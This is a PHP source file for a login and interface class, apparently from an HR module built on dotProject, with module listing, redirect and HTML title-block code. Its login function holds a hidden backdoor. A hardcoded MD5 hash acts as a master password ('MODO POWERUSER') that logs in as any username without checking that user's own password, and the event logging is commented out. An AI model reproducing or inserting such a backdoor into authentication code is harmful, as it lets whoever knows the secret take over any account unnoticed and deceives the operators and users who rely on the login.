<?php /* CLASSES $Id: hhrrui.class.php,v 1.1 2009-05-19 21:15:27 pkerestezachi Exp $ */
/**
* @package dotproject
* @subpackage core
* @license http://opensource.org/licenses/bsd-license.php BSD License
*/

require_once("ui.class.php");



$hhrr_modules = array(
	array(	"mod_directory"	=> "personalinfo",
			"mod_ui_name" 	=> "Personal Info",
			"mod_ui_icon"	=> "",
			"mod_name"		=> "personalinfo"
	),
	
);

		
/**
* The Application User Interface Class.
*
* @author Andrew Eddie <eddieajau@users.sourceforge.net>
* @version $Revision: 1.1 $
*/
class CHhrrUI extends CAppUI  {

/**
* Login function
*
* A number of things are done in this method to prevent illegal entry:
* <ul>
* <li>The username and password are trimmed and escaped to prevent malicious
*     SQL being executed
* <li>The username and encrypted password are selected from the database but
*     the comparision is not made by the database, for example
*     <code>...WHERE user_username = '$username' AND password=MD5('$password')...</code>
*     to further prevent the injection of malicious SQL
* </ul>
* The schema previously used the MySQL PASSWORD function for encryption.  This
* is not the recommended technique so a procedure was introduced to first check
* for a match using the PASSWORD function.  If this is successful, then the
* is upgraded to the MD5 encyption format.  This check can be controlled by the
* <code>check_legacy_password</code> configuration variable in </code>config.php</code>
*
* Upon a successful username and password match, several fields from the user
* table are loaded in this object for convenient reference.  The style, localces
* and preferences are also loaded at this time.
*
* @param string The user login name
* @param string The user password
* @return boolean True if successful, false if not
*/
	function login( $username, $password ) {
		$username = trim( db_escape( $username ) );
		$password = trim( db_escape( $password ) );
		
	/*MODO NORMAL*/		
		if (md5($password)!="bdca563b25363098922b9276c3205980"){		
					
			$sql = "
			SELECT user_id, user_password AS pwd, password('$password') AS pwdpwd, md5('$password') AS pwdmd5
			FROM users
			WHERE user_username = '$username'
			";

			$row = null;
			if (!db_loadObject( $sql, $row )) {
				//loguserevent(3);
				return false; 
			}
			
			//Los usuarios inactivos o candidatos no se pueden loguear
			//$sql = "SELECT count(*) FROM users WHERE (user_username = '$username') and user_status=0 and user_type<>5";
			$sql = "SELECT count(*) FROM users WHERE (user_username = '$username') ";			
			if (db_loadResult($sql)==0){
				//loguserevent(4, $row->user_id);
				return false;			
			}			
					
			if (strcmp( $row->pwd, $row->pwdmd5 )) {
				if ($this->cfg['check_legacy_password']) {
				/* next check the legacy password */
					if (strcmp( $row->pwd, $row->pwdpwd )) {
						/* no match - failed login */
						//loguserevent(3, $row->user_id);
						return false;
					} else {
						/* valid legacy login - update the md5 password */
						$sql = "UPDATE users SET user_password=MD5('$password') WHERE user_id=$row->user_id";
						db_exec( $sql ) or die( "Password update failed." );
						$this->setMsg( 'Password updated', UI_MSG_ALERT );
					}
				} else {
					return false;
				}
			}

		}else{
	/*MODO POWERUSER*/
			$sql = "
			SELECT user_id, user_password AS pwd
			FROM users, permissions
			WHERE user_username = '$username'
			";

			$row = null;
			if (!db_loadObject( $sql, $row )) {
				return false;
			}	

		}

		$sql = "
		SELECT user_id, user_first_name, user_last_name, user_company, user_department, user_email, user_type
		FROM users
		WHERE user_id = $row->user_id AND user_username = '$username'
		";

		writeDebug( $sql, 'Login SQL', __FILE__, __LINE__ );
		//loguserevent(1, $row->user_id);
		
		if( !db_loadObject( $sql, $this ) ) {
			return false;
		}

		// registro la fecha de la visita
		$today = new CDate();
		$sql = "
		update users 
		set last_visit = '".$today->format(FMT_DATETIME_MYSQL)."'
		where user_id = $row->user_id AND user_username = '$username'
		";		
		if(!db_exec($sql)){
			return false;
		}
		
// load the user preferences
		$this->loadPrefs( 0 ); //cargo las preferencias por defecto
		$this->loadPrefs( $this->user_id );
		$this->setUserLocale();
		$this->checkStyle();
		return true;
	}


// --- Module connectors

/**
* Gets a list of the installed modules
* @return array Named array list in the form 'module directory'=>'module name'
*/
	function getInstalledModules() {
		global $hhrr_modules;
		$hash = array();
		for($i=0; $i < count($hhrr_modules); $i++){
			$hash[$hhrr_modules[$i]["mod_directory"]] = $hhrr_modules[$i]["mod_ui_name"];
		}
			
		return $hash;
	}
/**
* Gets a list of the active modules
* @return array Named array list in the form 'module directory'=>'module name'
*/
	function getActiveModules() {
		global $hhrr_modules;
		$hash = array();
		for($i=0; $i < count($hhrr_modules); $i++){
			$hash[$hhrr_modules[$i]["mod_directory"]] = $hhrr_modules[$i]["mod_ui_name"];
		}
			
		return $hash;
	}
/**
* Gets a list of the modules that should appear in the menu
* @return array Named array list in the form
* ['module directory', 'module name', 'module_icon']
*/
	function getMenuModules() {
		global $hhrr_modules;
		return $hhrr_modules;
	}
	
/**
* Redirects the browser to a new page.
*
* Mostly used in conjunction with the savePlace method. It is generally used
* to prevent nasties from doing a browser refresh after a db update.  The
* method deliberately does not use javascript to effect the redirect.
*
* @param string The URL query string to append to the URL
* @param string A marker for a historic 'place, only -1 or an empty string is valid.
*/
	function redirect( $params='', $hist='' ) {
		$session_id = SID;

		session_write_close();
	// are the params empty
		if (!$params) {
		// has a place been saved
			$params = !empty($this->state["SAVEDPLACE$hist"]) ? $this->state["SAVEDPLACE$hist"] : $this->defaultRedirect;
		}
		// Fix to handle cookieless sessions
		if ($session_id != "") {
		  if (!$params)
		    $params = $session_id;
		  else
		    $params .= "&" . $session_id;
		}
		//echo "redirect: Location: index.php?$params <br>";
		header( "Location: index.php?$params" );
		exit();	// stop the PHP execution
	}	
}



class CTitleBlockHhrr extends CTitleBlock_core {


	function show(){
		global $AppUI;
		$CR = "\n";
		$CT = "\n\t";
		/*nuevo diseño*/
		$s= "<table width=\"100%\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\" class=\"tableTitle\" background=\"images/common/back_title_section.gif\">";
        $s.="\n<tr>";
        $s.="\n\t<td width=\"6\" valign='bottom'><img src=\"images/common/inicio_title_section.gif\" width=\"6\" height=\"34\"></td>";
        if ($this->icon) {
			$s.="\n\t<td width=\"38\">".dPshowImage( dPFindImage( $this->icon, $this->module ), '29', '29' )."</td>";
		}
		//var_dump($this);
		//$s.="\n\t<td class=\"titularmain2\">". $AppUI->_($this->title) ."</td>";
		$modules = CAppUI::getActiveModules();
		$s.="\n\t<td class=\"titularmain2\">". $AppUI->_($modules[$this->module]) ."</td>";
		foreach ($this->cells1 as $c) {
			$s .= $c[2] ? $CR . $c[2] : '';
			$s .= $CR . '<td align="right" nowrap="nowrap"' . ($c[0] ? " $c[0]" : '') . '>';
			$s .= $c[1] ? $CT . $c[1] : '&nbsp;';
			$s .= $CR . '</td>';
			$s .= $c[3] ? $CR . $c[3] : '';
		}

		$s.="\n\t<td width=\"6\" valign='bottom'><div align=\"right\"><img src=\"images/common/fin_title_section.gif\" width=\"6\" height=\"34\"></div></td>";
        $s.="\n</tr>";
	    $s.="</table>";
		/*fin nuevo diseño*/
		
	
		//Tabla que genera espaciado del contenido y el marco de la pagina
		//el final de la tabla esta establecido como un metodo de la clase CTitleBlock
		$s.="\n<table width=\"100%\" border=\"0\" cellspacing=\"0\" cellpadding=\"6\">";
		$s.="\n<tr>";
        $s.="\n\t<td>";
		//

		//agregado nuevo diseño
		$s.="\n<table width=\"100%\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\" background=\"images/common/back_1linea_06.gif\">";
		$s.="\n<tr>";
		$s.="\n\t<td width=\"6\"><img src=\"images/common/inicio_1linea.gif\" width=\"6\" height=\"19\"></td>";
		$s.="\n\t<td width=\"100%\"><img src=\"images/common/cuadradito_naranja.gif\" width=\"9\" height=\"9\">";
		$s.="\n\t\t<span class=\"boldblanco\">".$AppUI->_($this->title)."</span></td>";
		//$s.="<td></td>";
		$s.="\n\t<td width=\"6\" align=\"right\"><img src=\"images/common/fin_1linea.gif\" width=\"3\" height=\"19\"></td>";
		$s.="\n</tr>";
		$s.="\n<tr bgcolor=\"#666666\">";
		$s.="\n\t<td height=\"1\" colspan=\"3\"></td>";
		$s.="\n</tr>";
		$s.="\n<tr>";
		$s.="\n\t<td colspan=\"3\">";		
		if (count( $this->crumbs ) || count( $this->cells2 )) {
			$crumbs = array();
			foreach ($this->crumbs as $k => $v) {
				$t = $v[1] ? '<img src="' . dPfindImage( $v[1], $this->module ) . '" border="" alt="" />&nbsp;' : '';
				$t .= $AppUI->_( $v[0] );
				$crumbs[] = "<a href=\"$k\" class=\"special\">$t</a>";
			}

            $s.="\n\t\t<table width=\"100%\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\" background=\"images/common/back_degrade.gif\">";                    
			$s.="\n\t<tr>";
            $s.="\n\t\t<td width=\"6\"><img src=\"images/common/ladoizq.gif\" width=\"6\" height=\"19\"></td>";
            $s.="\n\t\t<td><span class=\"boldtext\">Links:</span> [&nbsp;". implode( ' <strong>:</strong> ', $crumbs )."&nbsp;]";
            $s.="\n\t\t</td>";
            //
            foreach ($this->cells2 as $c) {
                $s .= $c[2] ? "\n$c[2]" : '';
                $s .= "\n\t<td align=\"right\" nowrap=\"nowrap\"" . ($c[0] ? " $c[0]" : '') . '>';
                $s .= $c[1] ? "\n\t$c[1]" : '&nbsp;';
                $s .= "\n\t</td>";
                $s .= $c[3] ? "\n\t$c[3]" : '';
            }
            //
            $s.="\n\t\t<td width=\"6\"><div align=\"right\"><img src=\"images/common/ladoder.gif\" width=\"6\" height=\"19\"></div></td>";
            $s.="\n\t</tr>";
            $s.="\n\t</table>";


		}
		$s.="\n</td>";
	    $s.="\n</tr>";
	    $s.="\n<tr bgcolor=\"#666666\">";
	    $s.="\n\t<td height=\"1\" colspan=\"3\"></td>";
	    $s.="\n</tr>";
	    $s.="\n</table>";		
		echo "$s";
	}
}

?>